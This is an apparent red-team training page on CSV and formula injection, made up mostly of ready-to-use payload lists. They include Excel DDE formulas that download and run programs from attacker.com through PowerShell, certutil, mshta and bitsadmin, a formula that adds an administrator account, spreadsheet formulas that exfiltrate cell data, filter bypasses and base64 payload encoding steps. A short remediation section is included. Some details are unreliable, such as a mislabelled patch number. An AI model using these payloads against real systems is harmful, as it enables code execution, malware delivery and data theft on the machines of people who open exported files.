---
layout: training-page
title: "CSV Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - csv-injection
  - formula-injection
  - dde
  - web
page_key: "web-csv-injection"
render_with_liquid: false
---

# CSV Injection

CSV Injection, also known as Formula Injection, occurs when a web application allows user-controlled data to be exported into a CSV file that a victim then opens in a spreadsheet application (Excel, LibreOffice, Google Sheets). Spreadsheet software interprets cells beginning with certain characters as formulas and executes them, potentially leading to remote code execution on the victim's machine or data exfiltration.

## How It Works

Spreadsheet applications treat cells as formulas when they begin with any of these characters:

```
=
+
-
@
```

An attacker injects one of these prefixes into a field that gets stored and later exported in a CSV. When the victim opens the file, the formula executes.

## Dynamic Data Exchange (DDE) Attacks

DDE is a legacy Windows inter-process communication protocol that Excel supports. When a DDE formula is processed, Excel launches an external process such as `cmd.exe`.

### Spawn a Calculator (Proof of Concept)

```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
=cmd|' /C calc'!'A1'
```

### PowerShell Download and Execute

```
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

### Obfuscation and Command Chaining

These variants help bypass filters that look for the raw `cmd` string:

```
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A
```

### Using rundll32 Instead of cmd

```
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
```

### Null Character Bypass

Null characters are ignored by the formula interpreter but break string-based WAF filters:

```
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```

## DDE Payload Anatomy

Breaking down `=cmd|'/C calc'!A0`:

- `cmd` — the DDE server name (the process to launch)
- `/C calc` — the DDE topic, passed as the command argument
- `!A0` — the DDE item; specifies the data unit the server should return

## Google Sheets Data Exfiltration

Google Sheets supports URL-fetching formulas. These can be used for blind formula injection detection or out-of-band data exfiltration. The victim receives a warning prompt before the request fires, but many users click through.

```
=IMPORTXML("http://burp.collaborator.net/csv","//a/@href")
=IMPORTDATA("http://attacker.com/log?data="&A1)
=IMPORTFEED("http://attacker.com/collect")
=IMPORTHTML("http://attacker.com/collect","table",1)
```

Available Google Sheets import functions:

- `IMPORTXML(url, xpath_query)` — Fetches and parses XML/HTML from URL
- `IMPORTRANGE(spreadsheet_url, range)` — Imports data from another spreadsheet
- `IMPORTHTML(url, query, index)` — Imports a table or list from an HTML page
- `IMPORTFEED(url)` — Imports an RSS or Atom feed
- `IMPORTDATA(url)` — Imports data from a CSV or TSV at a URL

## Testing Methodology

Identify fields in the application that end up in CSV exports: usernames, first/last names, email addresses, addresses, comments, or any user-controlled string field. Inject a formula payload and trigger a CSV export, then open the file to observe behavior.

```
# Simple detection payload — if executed, will make outbound DNS/HTTP
=IMPORTXML(CONCAT("http://burp-collaborator.net/",SUBSTITUTE(A1," ","_")),"//a")

# Detect in Excel via DDE — shows a calc popup on open
=cmd|' /C calc'!'A1'
```

---

## Full Payload List by Spreadsheet Application

### Microsoft Excel — DDE Payloads

DDE payloads work in Excel for Windows. Excel shows a security warning before executing, but many users click through ("Enable Content"):

```
# Classic DDE — spawn calculator
=cmd|'/C calc.exe'!A0
=cmd|'/c calc'!A0
DDE("cmd","/C calc","")

# PowerShell cradle — download and execute
=cmd|'/C powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/payload.ps1'')"'!A0

# certutil download
=cmd|'/C certutil -urlcache -split -f http://attacker.com/evil.exe C:\Windows\Temp\evil.exe && C:\Windows\Temp\evil.exe'!A0

# mshta
=cmd|'/C mshta http://attacker.com/evil.hta'!A0

# bitsadmin
=cmd|'/C bitsadmin /transfer job http://attacker.com/evil.exe C:\Windows\Temp\evil.exe && C:\Windows\Temp\evil.exe'!A0

# Add user
=cmd|'/C net user attacker P@ssword123 /add && net localgroup administrators attacker /add'!A0
```

Excel DDE with obfuscation:

```
# Concatenation to bypass simple pattern matching
=CONCATENATE("=cmd|'/C calc'!A0")
# This does NOT execute — concatenation creates a string, not a formula

# But these do execute and bypass naive filters:
=cmd|  '/C calc'  !A0
=+cmd|'/C calc'!A0
=-cmd|'/C calc'!A0
=@cmd|'/C calc'!A0
```

### LibreOffice Calc — Macro and DDE Payloads

LibreOffice supports DDE and also has macro execution:

```
# DDE in LibreOffice
=DDE("soffice","","")
=DDE("cmd","/C calc","")

# LibreOffice also supports HYPERLINK formula
=HYPERLINK("http://attacker.com/collect?data="&A1,"Click here")

# Shell command in LibreOffice (requires macro permissions)
=SHELL("bash -c 'curl http://attacker.com/$(whoami)'")
```

### Google Sheets — IMPORTXML and HYPERLINK

```
# HYPERLINK — triggers when user clicks the cell
=HYPERLINK("http://attacker.com/?data="&A1,"Click here")

# IMPORTXML — fires automatically when sheet loads (with user confirmation)
=IMPORTXML("http://attacker.com/?d="&ENCODEURL(A1),"//a")

# IMPORTDATA — fires automatically
=IMPORTDATA("http://attacker.com/log.csv")

# Concatenate cell values for exfiltration
=IMPORTDATA(CONCAT("http://attacker.com/c?",ENCODEURL(CONCATENATE(A1,":",B1,":",C1))))

# IMPORTFEED also triggers outbound HTTP
=IMPORTFEED("http://attacker.com/feed")
```

---

## Dynamic Data Exchange (DDE) — Deep Dive

DDE is a Windows IPC mechanism dating to Windows 3.0. It allows one application to request data from another running process. Excel implements DDE to allow inter-application data sharing, but attackers abuse it to launch arbitrary processes.

DDE formula syntax in Excel:

```
=DDE_server|DDE_topic!DDE_item
```

For command execution:
- `DDE_server` = `cmd` or `powershell`
- `DDE_topic` = the command to execute (passed to /C or -Command)
- `DDE_item` = any string (e.g., `!A0`)

### Macro-Free RCE via DDE (Older Excel Versions)

In Excel 2016 and earlier without the December 2017 security patch (MS17-011) applied, DDE payloads execute without any "Enable Content" prompt:

```
=cmd|'/C powershell -enc <BASE64_PAYLOAD>'!A0
```

Base64 encode your PowerShell payload:

```bash
# Generate the base64-encoded command
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" | \
  iconv -t utf-16le | base64 -w 0
```

Post December 2017 patch: Excel shows a warning prompt but still executes if the user clicks through.

---

## Bypassing Basic Filters

Applications that try to sanitize CSV injection often implement naive blacklisting. Common bypass techniques:

### Tab-Separated Injection

Some applications only sanitize `=` as the first character but don't check TSV format:

```
# Tab character before the formula
	=cmd|'/C calc'!A0

# Using \t in the field
username: [TAB]=cmd|'/C calc'!A0
```

### Unicode / Full-Width Characters

Replace ASCII `=` with unicode equivalents that some parsers normalize:

```
＝cmd|'/C calc'!A0        (U+FF1D FULLWIDTH EQUALS SIGN)
```

### Encoding Variants

```
# HTML entity encoding in the CSV field (if the export doesn't properly decode)
&#61;cmd|'/C calc'!A0

# URL encoding (if the export URL-decodes values)
%3Dcmd|'/C calc'!A0
```

### Prefix Injection

Prepend a `+` or `-` instead of `=`:

```
+cmd|'/C calc'!A0
-cmd|'/C calc'!A0
@cmd|'/C calc'!A0
```

### Wrapping in Quotes

If the application wraps values in double-quotes, close them first:

```
","=cmd|'/C calc'!A0 ,"
```

---

## Where CSV Injection Surfaces

### Export Functions

The primary attack surface: any "Export to CSV", "Download data", "Export report" feature that includes user-submitted data.

Common export triggers:
- User account management pages (export user list)
- Order/transaction history exports
- Support ticket exports
- Form submission exports
- Log/audit trail downloads

### Log Downloads

Web application logs downloaded as CSV that include:
- HTTP headers (User-Agent, Referer)
- Request parameters
- Error messages

Inject via User-Agent or other logged headers:

```
User-Agent: =cmd|'/C calc'!A0
```

### Contact Forms / User Registration

Fields that end up in CSV exports from CRM systems or admin panels:
- First name, last name
- Company name
- Address fields
- Comment/message fields

---

## Impact Assessment

CSV injection impact depends heavily on who opens the file and in what context:

**High impact scenarios:**
- Admin or analyst opens an exported report containing attacker-injected formulas on a Windows machine with Excel
- The spreadsheet opens automatically in a CI/CD or data processing pipeline
- The DDE payload executes silently (pre-patch Excel) and deploys malware

**Lower impact scenarios:**
- The file is opened in a web-based viewer that doesn't execute formulas
- The user runs macOS with Numbers (DDE doesn't apply)
- The user has "Protected View" enabled and rejects the prompt
- The data is processed programmatically (not opened in a spreadsheet)

**Context for bug bounty:**
Many programs treat CSV injection as informational or low severity unless you can demonstrate actual formula execution in the target's use case. Demonstrate exploitation against the specific victim (admin who exports and opens the data) and show execution evidence.

---

## Detection Methodology

1. Identify all fields in the application that are stored and later exported in CSV.
2. Inject a DNS-callback payload as the test value:
   ```
   =IMPORTXML(CONCAT("http://your-collab.oastify.com/",A1),"//a")
   ```
3. Register the field value and trigger the CSV export.
4. Open the exported CSV in Excel or LibreOffice.
5. Monitor your collaborator server for the DNS/HTTP callback.
6. If confirmed, escalate to a DDE payload with calc.exe to demonstrate execution.

---

## Remediation

Applications should sanitize user-supplied values before including them in CSV output. The OWASP recommended approach is to prefix any cell value that starts with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single quote `'`. A single quote in a CSV cell tells the spreadsheet to treat the value as a literal string:

```python
# Python — safe CSV cell sanitization
def sanitize_csv_field(value):
    if isinstance(value, str) and value and value[0] in ('=', '+', '-', '@', '\t', '\r'):
        return "'" + value
    return value
```

```javascript
// JavaScript — sanitize before CSV export
function sanitizeCsvCell(value) {
  if (typeof value === 'string' && /^[=+\-@\t\r]/.test(value)) {
    return "'" + value;
  }
  return value;
}
```

---

## Resources

- CSV Excel Macro Injection — OWASP — `owasp.org/www-community/attacks/CSV_Injection`
- CSV Formula Injection — Google Bug Hunter University — `bughunters.google.com/learn/invalid-reports/google-products/4965108570390528`
- From CSV to Meterpreter — Adam Chester — `blog.xpnsec.com/from-csv-to-meterpreter/`
- The Absurdly Underestimated Dangers of CSV Injection — George Mauer — `georgemauer.net/2017/10/07/csv-injection.html`
- Three New DDE Obfuscation Methods — ReversingLabs — `blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation`
- DDE Payloads Reference — PayloadsAllTheThings — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection`
- Microsoft Security Advisory: DDE Attack — ADV170021 — `msrc.microsoft.com/update-guide/vulnerability/ADV170021`
